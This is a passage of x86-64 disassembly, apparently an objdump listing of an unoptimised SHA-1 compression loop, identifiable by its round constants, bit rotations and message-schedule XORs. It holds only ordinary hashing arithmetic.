  404055:	48 89 d1             	mov    %rdx,%rcx
  404058:	48 09 c1             	or     %rax,%rcx
  40405b:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  404062:	48 8b 95 50 ff ff ff 	mov    -0xb0(%rbp),%rdx
  404069:	48 31 d0             	xor    %rdx,%rax
  40406c:	48 23 85 70 ff ff ff 	and    -0x90(%rbp),%rax
  404073:	48 33 85 58 ff ff ff 	xor    -0xa8(%rbp),%rax
  40407a:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  40407e:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404085:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  404089:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404090:	89 c0                	mov    %eax,%eax
  404092:	48 c1 e8 1f          	shr    $0x1f,%rax
  404096:	48 09 c8             	or     %rcx,%rax
  404099:	48 89 45 88          	mov    %rax,-0x78(%rbp)
  40409d:	48 8b 45 88          	mov    -0x78(%rbp),%rax
  4040a1:	48 01 c2             	add    %rax,%rdx
  4040a4:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  4040ab:	48 01 d0             	add    %rdx,%rax
  4040ae:	48 05 99 79 82 5a    	add    $0x5a827999,%rax
  4040b4:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  4040bb:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  4040c2:	48 c1 e0 1e          	shl    $0x1e,%rax
  4040c6:	48 89 c2             	mov    %rax,%rdx
  4040c9:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  4040d0:	89 c0                	mov    %eax,%eax
  4040d2:	48 c1 e8 02          	shr    $0x2,%rax
  4040d6:	48 09 d0             	or     %rdx,%rax
  4040d9:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  4040e0:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
  4040e4:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  4040e8:	48 31 c2             	xor    %rax,%rdx
  4040eb:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  4040ef:	48 31 c2             	xor    %rax,%rdx
  4040f2:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  4040f6:	48 31 d0             	xor    %rdx,%rax
  4040f9:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  404100:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  404107:	48 c1 e0 05          	shl    $0x5,%rax
  40410b:	48 89 c2             	mov    %rax,%rdx
  40410e:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  404115:	89 c0                	mov    %eax,%eax
  404117:	48 c1 e8 1b          	shr    $0x1b,%rax
  40411b:	48 89 d1             	mov    %rdx,%rcx
  40411e:	48 09 c1             	or     %rax,%rcx
  404121:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  404128:	48 8b 95 70 ff ff ff 	mov    -0x90(%rbp),%rdx
  40412f:	48 31 d0             	xor    %rdx,%rax
  404132:	48 23 85 68 ff ff ff 	and    -0x98(%rbp),%rax
  404139:	48 33 85 50 ff ff ff 	xor    -0xb0(%rbp),%rax
  404140:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  404144:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  40414b:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  40414f:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404156:	89 c0                	mov    %eax,%eax
  404158:	48 c1 e8 1f          	shr    $0x1f,%rax
  40415c:	48 09 c8             	or     %rcx,%rax
  40415f:	48 89 45 90          	mov    %rax,-0x70(%rbp)
  404163:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  404167:	48 01 c2             	add    %rax,%rdx
  40416a:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  404171:	48 01 d0             	add    %rdx,%rax
  404174:	48 05 99 79 82 5a    	add    $0x5a827999,%rax
  40417a:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  404181:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  404188:	48 c1 e0 1e          	shl    $0x1e,%rax
  40418c:	48 89 c2             	mov    %rax,%rdx
  40418f:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  404196:	89 c0                	mov    %eax,%eax
  404198:	48 c1 e8 02          	shr    $0x2,%rax
  40419c:	48 09 d0             	or     %rdx,%rax
  40419f:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  4041a6:	48 8b 55 80          	mov    -0x80(%rbp),%rdx
  4041aa:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  4041ae:	48 31 c2             	xor    %rax,%rdx
  4041b1:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
  4041b5:	48 31 c2             	xor    %rax,%rdx
  4041b8:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  4041bc:	48 31 d0             	xor    %rdx,%rax
  4041bf:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  4041c6:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  4041cd:	48 c1 e0 05          	shl    $0x5,%rax
  4041d1:	48 89 c2             	mov    %rax,%rdx
  4041d4:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  4041db:	89 c0                	mov    %eax,%eax
  4041dd:	48 c1 e8 1b          	shr    $0x1b,%rax
  4041e1:	48 89 d1             	mov    %rdx,%rcx
  4041e4:	48 09 c1             	or     %rax,%rcx
  4041e7:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  4041ee:	48 8b 95 68 ff ff ff 	mov    -0x98(%rbp),%rdx
  4041f5:	48 31 d0             	xor    %rdx,%rax
  4041f8:	48 23 85 60 ff ff ff 	and    -0xa0(%rbp),%rax
  4041ff:	48 33 85 70 ff ff ff 	xor    -0x90(%rbp),%rax
  404206:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  40420a:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404211:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  404215:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  40421c:	89 c0                	mov    %eax,%eax
  40421e:	48 c1 e8 1f          	shr    $0x1f,%rax
  404222:	48 09 c8             	or     %rcx,%rax
  404225:	48 89 45 98          	mov    %rax,-0x68(%rbp)
  404229:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  40422d:	48 01 c2             	add    %rax,%rdx
  404230:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  404237:	48 01 d0             	add    %rdx,%rax
  40423a:	48 05 99 79 82 5a    	add    $0x5a827999,%rax
  404240:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  404247:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  40424e:	48 c1 e0 1e          	shl    $0x1e,%rax
  404252:	48 89 c2             	mov    %rax,%rdx
  404255:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  40425c:	89 c0                	mov    %eax,%eax
  40425e:	48 c1 e8 02          	shr    $0x2,%rax
  404262:	48 09 d0             	or     %rdx,%rax
  404265:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  40426c:	48 8b 55 88          	mov    -0x78(%rbp),%rdx
  404270:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  404274:	48 31 c2             	xor    %rax,%rdx
  404277:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  40427b:	48 31 c2             	xor    %rax,%rdx
  40427e:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  404282:	48 31 d0             	xor    %rdx,%rax
  404285:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  40428c:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  404293:	48 c1 e0 05          	shl    $0x5,%rax
  404297:	48 89 c2             	mov    %rax,%rdx
  40429a:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  4042a1:	89 c0                	mov    %eax,%eax
  4042a3:	48 c1 e8 1b          	shr    $0x1b,%rax
  4042a7:	48 89 d1             	mov    %rdx,%rcx
  4042aa:	48 09 c1             	or     %rax,%rcx
  4042ad:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  4042b4:	48 8b 95 58 ff ff ff 	mov    -0xa8(%rbp),%rdx
  4042bb:	48 31 d0             	xor    %rdx,%rax
  4042be:	48 33 85 68 ff ff ff 	xor    -0x98(%rbp),%rax
  4042c5:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  4042c9:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4042d0:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  4042d4:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4042db:	89 c0                	mov    %eax,%eax
  4042dd:	48 c1 e8 1f          	shr    $0x1f,%rax
  4042e1:	48 09 c8             	or     %rcx,%rax
  4042e4:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
  4042e8:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  4042ec:	48 01 c2             	add    %rax,%rdx
  4042ef:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  4042f6:	48 01 d0             	add    %rdx,%rax
  4042f9:	48 05 a1 eb d9 6e    	add    $0x6ed9eba1,%rax
  4042ff:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  404306:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  40430d:	48 c1 e0 1e          	shl    $0x1e,%rax
  404311:	48 89 c2             	mov    %rax,%rdx
  404314:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  40431b:	89 c0                	mov    %eax,%eax
  40431d:	48 c1 e8 02          	shr    $0x2,%rax
  404321:	48 09 d0             	or     %rdx,%rax
  404324:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  40432b:	48 8b 55 90          	mov    -0x70(%rbp),%rdx
  40432f:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  404333:	48 31 c2             	xor    %rax,%rdx
  404336:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
  40433a:	48 31 c2             	xor    %rax,%rdx
  40433d:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
  404341:	48 31 d0             	xor    %rdx,%rax
  404344:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  40434b:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  404352:	48 c1 e0 05          	shl    $0x5,%rax
  404356:	48 89 c2             	mov    %rax,%rdx
  404359:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  404360:	89 c0                	mov    %eax,%eax
  404362:	48 c1 e8 1b          	shr    $0x1b,%rax
  404366:	48 89 d1             	mov    %rdx,%rcx
  404369:	48 09 c1             	or     %rax,%rcx
  40436c:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  404373:	48 8b 95 50 ff ff ff 	mov    -0xb0(%rbp),%rdx
  40437a:	48 31 d0             	xor    %rdx,%rax
  40437d:	48 33 85 60 ff ff ff 	xor    -0xa0(%rbp),%rax
  404384:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  404388:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  40438f:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  404393:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  40439a:	89 c0                	mov    %eax,%eax
  40439c:	48 c1 e8 1f          	shr    $0x1f,%rax
  4043a0:	48 09 c8             	or     %rcx,%rax
  4043a3:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
  4043a7:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
  4043ab:	48 01 c2             	add    %rax,%rdx
  4043ae:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  4043b5:	48 01 d0             	add    %rdx,%rax
  4043b8:	48 05 a1 eb d9 6e    	add    $0x6ed9eba1,%rax
  4043be:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  4043c5:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  4043cc:	48 c1 e0 1e          	shl    $0x1e,%rax
  4043d0:	48 89 c2             	mov    %rax,%rdx
  4043d3:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  4043da:	89 c0                	mov    %eax,%eax
  4043dc:	48 c1 e8 02          	shr    $0x2,%rax
  4043e0:	48 09 d0             	or     %rdx,%rax
  4043e3:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  4043ea:	48 8b 55 98          	mov    -0x68(%rbp),%rdx
  4043ee:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  4043f2:	48 31 c2             	xor    %rax,%rdx
  4043f5:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  4043f9:	48 31 c2             	xor    %rax,%rdx
  4043fc:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  404400:	48 31 d0             	xor    %rdx,%rax
  404403:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  40440a:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  404411:	48 c1 e0 05          	shl    $0x5,%rax
  404415:	48 89 c2             	mov    %rax,%rdx
  404418:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  40441f:	89 c0                	mov    %eax,%eax
  404421:	48 c1 e8 1b          	shr    $0x1b,%rax
  404425:	48 89 d1             	mov    %rdx,%rcx
  404428:	48 09 c1             	or     %rax,%rcx
  40442b:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  404432:	48 8b 95 70 ff ff ff 	mov    -0x90(%rbp),%rdx
  404439:	48 31 d0             	xor    %rdx,%rax
  40443c:	48 33 85 58 ff ff ff 	xor    -0xa8(%rbp),%rax
  404443:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  404447:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  40444e:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  404452:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404459:	89 c0                	mov    %eax,%eax
  40445b:	48 c1 e8 1f          	shr    $0x1f,%rax
  40445f:	48 09 c8             	or     %rcx,%rax
  404462:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
  404466:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  40446a:	48 01 c2             	add    %rax,%rdx
  40446d:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  404474:	48 01 d0             	add    %rdx,%rax
  404477:	48 05 a1 eb d9 6e    	add    $0x6ed9eba1,%rax
  40447d:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  404484:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  40448b:	48 c1 e0 1e          	shl    $0x1e,%rax
  40448f:	48 89 c2             	mov    %rax,%rdx
  404492:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  404499:	89 c0                	mov    %eax,%eax
  40449b:	48 c1 e8 02          	shr    $0x2,%rax
  40449f:	48 09 d0             	or     %rdx,%rax
  4044a2:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  4044a9:	48 8b 55 a0          	mov    -0x60(%rbp),%rdx
  4044ad:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4044b1:	48 31 c2             	xor    %rax,%rdx
  4044b4:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  4044b8:	48 31 c2             	xor    %rax,%rdx
  4044bb:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
  4044bf:	48 31 d0             	xor    %rdx,%rax
  4044c2:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  4044c9:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  4044d0:	48 c1 e0 05          	shl    $0x5,%rax
  4044d4:	48 89 c2             	mov    %rax,%rdx
  4044d7:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  4044de:	89 c0                	mov    %eax,%eax
  4044e0:	48 c1 e8 1b          	shr    $0x1b,%rax
  4044e4:	48 89 d1             	mov    %rdx,%rcx
  4044e7:	48 09 c1             	or     %rax,%rcx
  4044ea:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  4044f1:	48 8b 95 68 ff ff ff 	mov    -0x98(%rbp),%rdx
  4044f8:	48 31 d0             	xor    %rdx,%rax
  4044fb:	48 33 85 50 ff ff ff 	xor    -0xb0(%rbp),%rax
  404502:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  404506:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  40450d:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  404511:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404518:	89 c0                	mov    %eax,%eax
  40451a:	48 c1 e8 1f          	shr    $0x1f,%rax
  40451e:	48 09 c8             	or     %rcx,%rax
  404521:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
  404525:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
  404529:	48 01 c2             	add    %rax,%rdx
  40452c:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  404533:	48 01 d0             	add    %rdx,%rax
  404536:	48 05 a1 eb d9 6e    	add    $0x6ed9eba1,%rax
  40453c:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  404543:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  40454a:	48 c1 e0 1e          	shl    $0x1e,%rax
  40454e:	48 89 c2             	mov    %rax,%rdx
  404551:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  404558:	89 c0                	mov    %eax,%eax
  40455a:	48 c1 e8 02          	shr    $0x2,%rax
  40455e:	48 09 d0             	or     %rdx,%rax
  404561:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  404568:	48 8b 55 a8          	mov    -0x58(%rbp),%rdx
  40456c:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  404570:	48 31 c2             	xor    %rax,%rdx
  404573:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  404577:	48 31 c2             	xor    %rax,%rdx
  40457a:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  40457e:	48 31 d0             	xor    %rdx,%rax
  404581:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  404588:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  40458f:	48 c1 e0 05          	shl    $0x5,%rax
  404593:	48 89 c2             	mov    %rax,%rdx
  404596:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  40459d:	89 c0                	mov    %eax,%eax
  40459f:	48 c1 e8 1b          	shr    $0x1b,%rax
  4045a3:	48 89 d1             	mov    %rdx,%rcx
  4045a6:	48 09 c1             	or     %rax,%rcx
  4045a9:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  4045b0:	48 8b 95 60 ff ff ff 	mov    -0xa0(%rbp),%rdx
  4045b7:	48 31 d0             	xor    %rdx,%rax
  4045ba:	48 33 85 70 ff ff ff 	xor    -0x90(%rbp),%rax
  4045c1:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  4045c5:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4045cc:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  4045d0:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4045d7:	89 c0                	mov    %eax,%eax
  4045d9:	48 c1 e8 1f          	shr    $0x1f,%rax
  4045dd:	48 09 c8             	or     %rcx,%rax
  4045e0:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
  4045e4:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  4045e8:	48 01 c2             	add    %rax,%rdx
  4045eb:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  4045f2:	48 01 d0             	add    %rdx,%rax
  4045f5:	48 05 a1 eb d9 6e    	add    $0x6ed9eba1,%rax
  4045fb:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  404602:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  404609:	48 c1 e0 1e          	shl    $0x1e,%rax
  40460d:	48 89 c2             	mov    %rax,%rdx
  404610:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  404617:	89 c0                	mov    %eax,%eax
  404619:	48 c1 e8 02          	shr    $0x2,%rax
  40461d:	48 09 d0             	or     %rdx,%rax
  404620:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  404627:	48 8b 55 b0          	mov    -0x50(%rbp),%rdx
  40462b:	48 8b 45 88          	mov    -0x78(%rbp),%rax
  40462f:	48 31 c2             	xor    %rax,%rdx
  404632:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  404636:	48 31 c2             	xor    %rax,%rdx
  404639:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  40463d:	48 31 d0             	xor    %rdx,%rax
  404640:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  404647:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  40464e:	48 c1 e0 05          	shl    $0x5,%rax
  404652:	48 89 c2             	mov    %rax,%rdx
  404655:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  40465c:	89 c0                	mov    %eax,%eax
  40465e:	48 c1 e8 1b          	shr    $0x1b,%rax
  404662:	48 89 d1             	mov    %rdx,%rcx
  404665:	48 09 c1             	or     %rax,%rcx
  404668:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  40466f:	48 8b 95 58 ff ff ff 	mov    -0xa8(%rbp),%rdx
  404676:	48 31 d0             	xor    %rdx,%rax
  404679:	48 33 85 68 ff ff ff 	xor    -0x98(%rbp),%rax
  404680:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  404684:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  40468b:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  40468f:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404696:	89 c0                	mov    %eax,%eax
  404698:	48 c1 e8 1f          	shr    $0x1f,%rax
  40469c:	48 09 c8             	or     %rcx,%rax
  40469f:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
  4046a3:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  4046a7:	48 01 c2             	add    %rax,%rdx
  4046aa:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  4046b1:	48 01 d0             	add    %rdx,%rax
  4046b4:	48 05 a1 eb d9 6e    	add    $0x6ed9eba1,%rax
  4046ba:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  4046c1:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  4046c8:	48 c1 e0 1e          	shl    $0x1e,%rax
  4046cc:	48 89 c2             	mov    %rax,%rdx
  4046cf:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  4046d6:	89 c0                	mov    %eax,%eax
  4046d8:	48 c1 e8 02          	shr    $0x2,%rax
  4046dc:	48 09 d0             	or     %rdx,%rax
  4046df:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  4046e6:	48 8b 55 b8          	mov    -0x48(%rbp),%rdx
  4046ea:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  4046ee:	48 31 c2             	xor    %rax,%rdx
  4046f1:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  4046f5:	48 31 c2             	xor    %rax,%rdx
  4046f8:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  4046fc:	48 31 d0             	xor    %rdx,%rax
  4046ff:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  404706:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  40470d:	48 c1 e0 05          	shl    $0x5,%rax
  404711:	48 89 c2             	mov    %rax,%rdx
  404714:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  40471b:	89 c0                	mov    %eax,%eax
  40471d:	48 c1 e8 1b          	shr    $0x1b,%rax
  404721:	48 89 d1             	mov    %rdx,%rcx
  404724:	48 09 c1             	or     %rax,%rcx
  404727:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  40472e:	48 8b 95 50 ff ff ff 	mov    -0xb0(%rbp),%rdx
  404735:	48 31 d0             	xor    %rdx,%rax
  404738:	48 33 85 60 ff ff ff 	xor    -0xa0(%rbp),%rax
  40473f:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  404743:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  40474a:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  40474e:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404755:	89 c0                	mov    %eax,%eax
  404757:	48 c1 e8 1f          	shr    $0x1f,%rax
  40475b:	48 09 c8             	or     %rcx,%rax
  40475e:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
  404762:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  404766:	48 01 c2             	add    %rax,%rdx
  404769:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  404770:	48 01 d0             	add    %rdx,%rax
  404773:	48 05 a1 eb d9 6e    	add    $0x6ed9eba1,%rax
  404779:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  404780:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  404787:	48 c1 e0 1e          	shl    $0x1e,%rax
  40478b:	48 89 c2             	mov    %rax,%rdx
  40478e:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  404795:	89 c0                	mov    %eax,%eax
  404797:	48 c1 e8 02          	shr    $0x2,%rax
  40479b:	48 09 d0             	or     %rdx,%rax
  40479e:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  4047a5:	48 8b 55 c0          	mov    -0x40(%rbp),%rdx
  4047a9:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  4047ad:	48 31 c2             	xor    %rax,%rdx
  4047b0:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  4047b4:	48 31 c2             	xor    %rax,%rdx
  4047b7:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  4047bb:	48 31 d0             	xor    %rdx,%rax
  4047be:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  4047c5:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  4047cc:	48 c1 e0 05          	shl    $0x5,%rax
  4047d0:	48 89 c2             	mov    %rax,%rdx
  4047d3:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  4047da:	89 c0                	mov    %eax,%eax
  4047dc:	48 c1 e8 1b          	shr    $0x1b,%rax
  4047e0:	48 89 d1             	mov    %rdx,%rcx
  4047e3:	48 09 c1             	or     %rax,%rcx
  4047e6:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  4047ed:	48 8b 95 70 ff ff ff 	mov    -0x90(%rbp),%rdx
  4047f4:	48 31 d0             	xor    %rdx,%rax
  4047f7:	48 33 85 58 ff ff ff 	xor    -0xa8(%rbp),%rax
  4047fe:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  404802:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404809:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  40480d:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404814:	89 c0                	mov    %eax,%eax
  404816:	48 c1 e8 1f          	shr    $0x1f,%rax
  40481a:	48 09 c8             	or     %rcx,%rax
  40481d:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
  404821:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  404825:	48 01 c2             	add    %rax,%rdx
  404828:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  40482f:	48 01 d0             	add    %rdx,%rax
  404832:	48 05 a1 eb d9 6e    	add    $0x6ed9eba1,%rax
  404838:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  40483f:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  404846:	48 c1 e0 1e          	shl    $0x1e,%rax
  40484a:	48 89 c2             	mov    %rax,%rdx
  40484d:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  404854:	89 c0                	mov    %eax,%eax
  404856:	48 c1 e8 02          	shr    $0x2,%rax
  40485a:	48 09 d0             	or     %rdx,%rax
  40485d:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  404864:	48 8b 55 c8          	mov    -0x38(%rbp),%rdx
  404868:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  40486c:	48 31 c2             	xor    %rax,%rdx
  40486f:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  404873:	48 31 c2             	xor    %rax,%rdx
  404876:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  40487a:	48 31 d0             	xor    %rdx,%rax
  40487d:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  404884:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
